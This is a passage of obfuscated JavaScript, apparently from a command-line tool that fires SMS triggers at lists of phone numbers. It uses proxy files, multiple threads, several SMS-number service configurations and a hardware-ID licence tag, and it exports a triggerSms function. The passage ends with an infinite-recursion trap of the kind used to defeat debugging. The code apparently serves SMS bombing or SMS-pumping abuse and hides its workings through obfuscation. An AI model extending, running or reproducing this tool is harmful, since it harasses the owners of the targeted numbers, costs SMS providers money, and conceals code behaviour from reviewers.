          'value': "exit"
        }]);
        if (v822 === "reuse") {
          {
            if (fs.existsSync(v804)) {
              {
                let v879 = fs.readFileSync(v804, "utf8").split('\x0a').map(v880 => v880.split('|')[0].trim()).filter(v881 => v881.length > 5);
                fs.writeFileSync(v763, v879.join('\x0a')), fs.writeFileSync(v804, ''), console.log("\n  [32m✓ Copied " + v879.length + " successful numbers to " + v763 + " and cleared " + v804 + ".[0m\n");
              }
            } else {
              console.log("\n  [31m✗ No successful numbers found.[0m\n"), v769 = false;
            }
          }
        } else {
          if (v822 === "home") {
            const v882 = await interactiveWizard();
            v758 = [v882.numbersFile, v882.threads, v882.proxiesFile, v882.region, v882.browser, "SKING-UI-HARDWARE-ID", v882.resends], v759 = v882.nexaConfig, v760 = v882.twoOoConfig || null, v761 = v882.smsBowerConfig || null, v762 = v882.zenexConfig || null, v763 = path.resolve(v758[0] || "numbers.txt"), v764 = parseInt(v758[1]) || 20, v765 = v758[2] !== undefined ? v758[2] : "proxies.txt";
            if (v765.toLowerCase() === "none" || v765 === "false") v765 = '';
          } else v769 = false;
        }
      }
    }
  }
  start()["catch"](v883 => {
    console.error(R("Fatal error: " + v883.message));
    process.exit(1);
  });
}
const v87 = {};
v87.triggerSms = triggerSms, module.exports = v87;
function fn2(v884) {
  function fn11(v885) {
    fn11(++v885);
  }
  try {
    if (v884) {
      return fn11;
    } else {
      fn11(0);
    }
  } catch (v886) {}
}
